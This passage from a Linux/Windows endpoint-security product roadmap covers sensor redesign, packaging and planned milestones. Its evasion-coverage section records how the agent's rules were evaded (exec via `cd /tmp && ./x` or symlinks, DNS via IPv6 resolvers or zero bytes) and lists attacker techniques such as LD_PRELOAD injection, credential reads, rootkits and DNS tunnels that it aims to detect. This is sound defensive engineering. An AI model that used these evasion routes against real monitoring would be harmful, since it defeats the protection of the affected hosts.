  37: `nn-lab.sh overhead` alternates the agent off and on over four
  micro-workloads — open, write, exec, connect on loopback — and reports the
  median of the lost throughput and the agent's CPU. First round on 6.8, with
  the host not idle: open −37 %, write −47 %, exec −11 %, connect
  −31 %. The cost on files comes from the `sys_enter_openat` sensor, which sends
  every open of the host to userland even when the agent then drops it: it must be
  filtered in the kernel together with the move to LSM in 10.9 (finding 45).
  The INFO log of each exec is about 5 % of the agent's CPU on
  execs. The same round found two false positives that killed
  legitimate processes, findings 38 and 47, closed in lab PR 36. Official
  numbers over three rounds on an idle host, Ubuntu 24.04, 12 October (lab PR
  69): open +25.4 %, write +29.1 %, exec +8.6 %, connect +34.1 %, udp
  +25.2 %, dns +14.2 %; the other guests are still open. Raw figure from the soak:
  ~34 % of one vCPU at 20 exec/s + 10 files/s + 5 tcp/s. Figures withdrawn with
  lab PR 228: the raw data had not been kept; now the figures
  come only from the result files of `nn-lab.sh perf`, committed in
  `docs/validation/results/` (the first: Ubuntu 24.04, kernel 6.8, 21
  October, with the A/A check and the gate thresholds,
  `docs/validation/PERF_BASELINE.md`); the other guests are still open)
- `.deb`/`.rpm` packages. Prerequisites done on 11 October:
  - binaries outside `/usr/local/bin` (lab PR 39, findings 26 and 51): the agent
    protects and recognises both the `install.sh` layout and `/usr/bin` +
    `/usr/lib/systemd/system`, which `install.sh` accepts with
    `BIN_DIR`/`UNIT_DIR`; also closed: a copy of the unit in the
    systemd runtime directories that replaced it without leaving a trace;
  - the package manager survives the agent (lab PR 38, finding 49):
    the FIM rules killed `dpkg` on units, timers, cron, PAM modules and
    setuid binaries and left packages half done; now the writes of
    dpkg/rpm/dnf and of their scripts stay recorded as Low with no kill,
    and `nn-lab.sh pkgmgr-check` checks it.
  Packages done on 11 October, lab PR 40: `.deb` and `.rpm` built with
  dpkg-deb and rpmbuild, published and attested with the tarball; the
  package scripts reuse `install.sh`/`uninstall.sh` (migration from
  an install made with `install.sh`, upgrade and removal only with the
  trusted-installer window, no start at the first install);
  `nn-lab.sh pkg-check` checks the whole life cycle, passed on Ubuntu
  24.04, Debian 12 and Ubuntu 22.04, and on 12 October on AlmaLinux 9 with
  the RPM, together with `pkgmgr-check` with rpm and dnf (lab PR 68)
- External BTF for kernels without native BTF (assessed on 11 October, lab PR
  41, founder's decision: the LSM, fentry/fexit and `tp_btf` programs
  attach through the kernel's internal BTF, which no external file
  can provide, so external BTF would only serve a
  telemetry-only mode without anti-tamper, refused today by the
  fail-closed policy; the assessment found and closed finding 53: without
  BTF the anti-tamper attach degraded with a WARN instead of refusing
  to start. Details in `docs/operator/KERNEL_COMPATIBILITY.md`)

Demo: the same tarball installed and verified on four distributions,
nightly green on all of them, a release verifiable with one command, a 24 h
soak with no memory growth.
State on 11 October (lab PR 45): the same tarball built and attested
by the CI passes `nn-lab.sh release-check` on Ubuntu 24.04, Ubuntu 22.04 and
Debian 12 (checksums, binaries that run on the guest's glibc, `install.sh`
verification with `checksums` provenance, integrity at boot, hooks, probe,
one detection). On 12 October also on AlmaLinux 9, with the CI artefacts
of `main` 1777e6f: the demo holds on the four distributions.

---

## Tappa 10.9 — Evasion coverage (in progress)

Goal: the rules stop depending on the binary's path alone,
and the sensor sees the channels that escape it today. Decided on 10 October
2026 after an external review of the inventory (a comparison with Falcon,
Elastic Defend, Tetragon, Tracee, Falco and the 2024–2026 literature); it does
not change the order of the later Tappe.

- Sensor attach point (design of 11 October,
  `docs/design/TAPPA10_9_SENSOR_ATTACH_POINTS_DESIGN.md`, merged at the
  founder's request: the proposed options for the six decisions hold
  unless stated otherwise; Q5 is reworded after step 0, because
  `fexit` on `ip_make_skb` attaches only from 6.5 and the
  `kretprobe` stays. Step 0 done on 11 October: throwaway probes on LSM
  `file_open` and `bprm_check_security`, `kretprobe` on `ip_make_skb` /
  `ip6_make_skb` and `kprobe` on `udp_send_skb`, loaded and exercised by
  `nn-lab.sh sensor-feasibility`, 18/18 properties on 6.8, 6.1 and 5.15
  (AlmaLinux 9 after the soak). Cost per open measured on 6.8: an
  empty LSM program adds 147 ns (−4.6 %), so the 5 % threshold
  cannot be reached in the lab (a new decision Q7 for the founder); the
  full filter costs 1.6 µs and must be cached per directory. Step 1
  (file opens) done on 12 October (lab PR 52) in the FIM observer on
  `file_open`: rules by inode, by (parent, name) and by credential
  name, directory class in a cache (the walk up the
  ancestors is a global BPF function, verified on its own: inline it went over
  the 5.15 verifier's million instructions), writes counted in the
  kernel (`Event::MassWrite`), `sys_enter_openat` detached once
  the sensor is armed (a `--file-open-sensor tracepoint` switch for one
  soak cycle); finding 54 fixed (credentials in every home reported
  without a kill, a new decision Q8 for the founder); `nn-lab.sh
  open-sensor-check` 8/8 and `tamper-check` OK on 6.8, 5.15 and 6.1. Measured on
  6.8: loss on opens from 31.9 % to 28.2 %, the agent's CPU per
  open from 6.4 µs to almost zero; the halving proposed in Q7 is not
  reached, because the rest comes from the FIM hooks on close and on
  write (new finding 59, a decision for the founder). Step 2 (exec)
  done on 12 October (lab PR 53): sensor on LSM `bprm_check_security`,
  the exec rules read the file being run from the kernel (finding 61:
  `cd /tmp && ./x`, a symlink or `..` evaded R001–R010);
  `nn-lab.sh exec-sensor-check` 8/8 on 6.8, 6.1 and 5.15. Step 3 (DNS) on
  12 October (lab PR 57): kprobe on `udp_send_skb` / `udp_v6_send_skb`, the
  QNAME is read from the kernel's copy, also towards IPv6 resolvers
  (findings 66 and 67: an IPv6 resolver, a page not loaded yet or a
  zero byte in a label evaded NET-004); Q5 is revised because the
  `kretprobe` on `ip_make_skb` does not see the destination port;
  `nn-lab.sh dns-sensor-check`. Found along the way: findings 65 (the fix
  of the release build for x86-64-v2 did not reach the build, fixed)
  and 68 (UDP flows to IPv6 with no netflow row). Found
  and fixed finding 55: on btrfs
  the userland `(dev, ino)` keys did not match the
  kernel's, and FIM and file protection saw nothing (now the kernel
  uses the subvolume's device, like `stat()`; `nn-lab.sh btrfs-check`).
  No rule reads the
  `openat` events, which only serve the posture, and the only use that
  needs every open is the count of mass writes,
  so the sensor can filter and count in the kernel; found
  finding 54: with the base FIM list, the credentials in the users'
  homes are not watched) (research of 11 October: the "Phantom" TOCTOU
  of Guo/Zeng and the io_uring channel): `sys_enter_openat` → LSM `file_open`
  (path from the `struct file`, `bpf_path_d_path` where it exists); DNS QNAME read
  after the copy into the kernel, not from the user iov at the entry of
  `udp_sendmsg`; `sys_enter_execve` → LSM `bprm_check_security` with an optional
  deny for R001–R004 and for quarantined hashes (the
  toolchain limit cited in `exec_check.rs` no longer holds: the agent already attaches
  more than twenty LSM programs with the same toolchain)
- Workload context: cgroup id, namespaces (pid/mnt/net) and,
  where present, container id, image, pod and systemd unit in the
  process, file and network events; allowlists and rules by identity (cgroup,
  unit, user) as well as by path
- Runtime injection: `process_vm_writev`/`readv`, writes to
  `/proc/<pid>/mem`, `LD_PRELOAD` and `LD_LIBRARY_PATH` from the
  process environment (today only the `ld.so.preload` file), loading of shared
  objects from volatile paths, uprobes on interpreters (python, perl, node,
  bash) to attribute scripts run from stdin or `-c`
- Living off the land: indirect exec (`fexecve`, scripts from stdin,
  `systemd-run`, copies of legitimate binaries in allowed paths) covered
  by identity and by behaviour, not by name
- Encrypted DNS and tunnels: DoH/DoT to resolvers that are not configured,
  anomalous volumes on DNS and ICMP, beacons with jitter towards legitimate CDNs
- Canary use case extended to accounts (SSH keys and decoy tokens)
- Correlated persistence, not only observed: a chain of a unit,
  timer or cron write → `systemctl enable/start` or `crontab` → execution of the
  binary from PID 1 or from cron, with a severity that rises at each link
  (today FIM-007/009/023 see the write, not the execution)
- Generic masquerading (T1036): a binary with the name of a system
  tool run outside the paths managed by the package manager, or
  with a hash different from the installed package (`dpkg -V`/`rpm -V` as
  the oracle); accounts (T1136): `useradd`/`usermod`/`passwd`, new UID 0,
  changes to `shadow` and `sudoers` as an account event and not only
  as file drift
- LSM hooks missing compared with the 2024–2026 state of the art, in order:
  `sb_mount`/`move_mount`/`sb_umount` (mount, bind mount, overlay,
  pivot_root, chroot); `task_fix_setuid` and `capable` (uid/gid changes and
  capability use in the lineage, today seen only at exec);
  `mmap_file`/`file_mprotect` (executable memory after a write, W^X —
  today we cover only exec from memfd/`/proc/self/fd`, R004);
  `socket_bind`/`socket_accept` and `inet_sock_set_state` (bind and accept
  are not seen today; connect, listen and close are); the
  `sched_process_fork` tracepoint for the full lineage; `kernel_load_data` and
  `kernel_read_file` (kexec, firmware, modules and livepatches loaded from
  userland: today we see only `module_load`)
- Exec by inode property, not by path: tmpfs, memfd,
  `O_TMPFILE`, `nlink == 0`, `execveat(AT_EMPTY_PATH)`, dynamic loader
  as argv[0] (Elastic FENIX 2026); process identity by a hash
  computed in the kernel (`bpf_ima_file_hash`, where IMA is active)
- BPF ecosystem, second phase: `bpf_prog` hook and rare helpers detected at
  load (`bpf_probe_write_user`, `bpf_override_return`,
  `bpf_send_signal` — Datadog 2026, the LinkPro and VoidLink rootkits), XDP/TC
  attaches observed
- Kernel integrity: `init_module` from a buffer, distinct from `finit_module`
  (with capture of the blob); a periodic check of the syscall table, ftrace
  operations and the module list (hidden modules); credentials changed without
  a legitimate setuid (a shadow copy, as LKRG does); cross views for hidden processes
  and sockets (PUMAKIT, VoidLink)
- JA4 in the blocklist next to JA3 (today no sensor captures
  the TLS fingerprint, neither JA3 nor JA4: NN-L-NET-003 is inactive, BUG-025, and
  `nn-admin net status` says so; the capture is needed first)
- Inline enforcement (LSM `-EPERM`) for a deterministic subset
  of the rules: exec from tmpfs/memfd, reading credentials from binaries
  outside the allowlist, connect to the blocklist; the LLM and the posture ladder
  stay in userland
- Namespace operations seen from the syscall (`unshare`, `setns`,
  `clone` with `CLONE_NEW*`), not from the tool's name (R013 today looks at
  `nsenter`/`unshare` by comm)
- Workload identity on Kubernetes (SPIFFE/SVID and service account
  tokens observed at the point of use, correlated with process, cgroup
  and connection): a prerequisite of Tappe 13–14, not of the core

Demo: the same attack run from a container, from a script passed
to `python3 -c` and through `io_uring` produces the same detection chain
as the one run from a shell in `/tmp`.

---

## Tappa (ex 9) — Native Rust local UI (not started, moved after 10.9)

Goal: an attractive interface, 100% Rust, no Electron.

- A hands-on comparison of: Iced, Slint, Tauri+Yew (Rust→WASM)
- Decision made with a quick prototype of a single dashboard page
- Implementation: real-time alert list, manual action buttons,
  agent status, filterable logs
- Design: dark, military, readable. No generic SaaS UI.
- Survey of the data surface already done:
  `docs/tappa9/UI_DATA_SURFACE_RECON.md`

Demo: you open the GUI, see alerts in real time, click "Quarantine"
on a manual event, and the action starts.

---

## Tappa (ex 10) — Proactive Scout: assessment + hardening (not started, moved after 10.9)

Goal: at install, NorthNarrow closes the gaps.

- Linux posture scanner:
  - Anomalous SUID/SGID permissions
  - sshd_config (RootLogin, PasswordAuthentication)
  - SELinux/AppArmor status
  - Services exposed on the network
  - Known CVEs of the installed kernel
  - Chain of trust of the boot and the kernel (review of 10 October
    2026): Secure Boot and UKI with measured boot, `lockdown=integrity`,
    module signing, kexec and livepatch restricted, IMA/EVM in appraisal
    on the binaries and the units, immutable `/usr` (dm-verity, signed
    sysexts), a dedicated bpffs — what makes the agent's anti-tamper
    impossible for root to get around
- Baseline of the controls: ANSSI-BP-028 v2.0 (SCAP/ComplianceAsCode content,
  Licence Ouverte 2.0) instead of a proprietary list, with the level
  reached (Minimal → High) in the report; an optional "appliance" profile with
  IPE + dm-verity (6.12+), where the agent's binary cannot be replaced,
  not even by root offline
- The LLM reasons about priorities + proposes fixes
- Auto-fix mode (with admin confirmation the first time)
  vs report-only

Demo: you install NorthNarrow on a VM with a weak config. Scan in 30s,
a report of 12 gaps, 8 fixed automatically, 4 flagged for review.

---

## Tappa 11 — Windows agent: user-mode sensors (ETW)

Goal: Linux→Windows parity without taking on a kernel driver yet.

- Sensors based on Event Tracing for Windows through the ferrisetw crate
- Capture: process creation, network connections, file operations,
  registry writes
- Reuse of the whole decision engine, executor and LLM from Tappe 1-6
- Windows executors: OpenProcess + TerminateProcess,
  the Windows Filtering Platform user-mode API to block the network

Demo: the same ransomware test as Tappa 5, run on Windows.
The same response: kill + isolation.

---

## Tappa 12 — Windows kernel driver (when mature)

Goal: kernel-grade anti-tamper on Windows.

- Assessment of windows-drivers-rs maturity (today it is in preview)
- If still in preview → we keep user-mode ETW + WDAC hardening as an
  alternative
- If production-ready → minifilter + ObCallbacks in no_std Rust
- Microsoft driver signing (€€€) and WHQL submission

Gate decision: before starting this Tappa, an audit of the maturity
of windows-drivers-rs. If it is not production-ready, it is postponed and
we move on to Tappa 13.

---

## Tappa 13 — Sovereign EU C2 backend

Goal: a coordinated multi-agent fleet, EU-sovereign.

- Server in Rust (Axum)
- mTLS through rustls
- NATS JetStream for event ingestion
- ClickHouse for cold storage
- VictoriaMetrics for metrics
- Object storage: Garage (sovereignty tier)
- Deployable on-prem or on EU-only cloud
- A watchdog outside the host (review of 10 October 2026): a heartbeat
  signed by the agent with its version, the hashes of the BPF programs, the
  state of bpffs and, where there is a TPM, PCR quotes; the backend tells
  apart a missing heartbeat, an invalid signature, a diverging BPF baseline
  and diverging PCRs, and quarantines the host; chain logs forwarded
  append-only, because local logs are not enough against root

Demo: 3 agents (2 Linux + 1 Windows) connected to the C2. A dashboard
shows the fleet in real time.

---

## Tappa 14 — Central console (fleet management)

Goal: the admin manages the fleet from a single UI.

- Extension of the Tappa 9 UI in "central console" mode
- Host list, aggregated alerts, autonomy level overrides per host
- Key Vault management for key recovery
- Compliance reporting (NIS2, ISO 27001, GDPR)

Demo: the console shows 50 simulated hosts, alerts filterable by host,
a bulk action "isolate all hosts with verdict=High".

---

## Tappa 15 — Selective advanced hardening (from Gemini's v3)

Goal: graft the advanced features where they have the highest ROI.

Candidates from the external review of 10 October 2026 (features
of a mature product, not defects of the core): per-flow network enforcement
with TC/XDP or `cgroup/connect` (policy by uid, cgroup, container
and destination, not only killing the process); binary reputation,
similarity and YARA rules; vulnerability exposure (package CVEs
linked to runtime telemetry); admin and agent keys
protected by a TPM with host attestation; SIEM, syslog and
OpenTelemetry integration; a "runtime SBOM" (an inventory of the binaries run, with hash
and provenance).

Selection at that point based on:
- The current threat landscape
- Feedback from beta customers
- Maturity of the chosen technologies

Candidates (see VISION_TECHNICAL.md for details):
- Local honeypots (deception layer)
- JA4 fingerprinting
- Anti-BYOVD (Windows driver blocklist)
- Linux IOMMU enforcement
- Virtual patching through eBPF

---

## Tappa 16 — Private beta

Goal: validation with 5-10 real organisations.

- Recruiting beta testers (Italian SMEs, EU)
- Assisted onboarding
- Weekly feedback loop
- Bug fixes + iteration

---

## Tappa 17 — Public launch

Goal: NorthNarrow commercially available.

- Website, pricing, sales funnel
- Complete documentation
- Compliance certifications started (NIS2 readiness, eIDAS where applicable)
- Customer success
- Launch announcement

---

## Golden rule

One Tappa at a time. None is skipped. There is no going back.
When a Tappa is closed and tested, we move on to the next one.
If Claude (any version) tries to change the order without the
founder explicitly asking for it, Claude is wrong.

Changes to this roadmap need an explicit change to the file by
the founder. It is not changed by agreement in a conversation.

Update of 9 October 2026, explicitly requested by the founder:
Tappe 9 → 10.7 reflect the work done (FIM, deception, network,
rules, depth, adversarial), and 10.8 gathers the cross-cutting
reliability work; "Local UI" and "Proactive Scout" stay in the
roadmap, moved after 10.8, with their final numbering to be assigned
by the founder.

Update of 20 October 2026, on the founder's decision (Wave 4, lab PR
214): the on-host LLM advisor was removed (Tappa 6 except 6.5); see the
product decision at the top of the file.
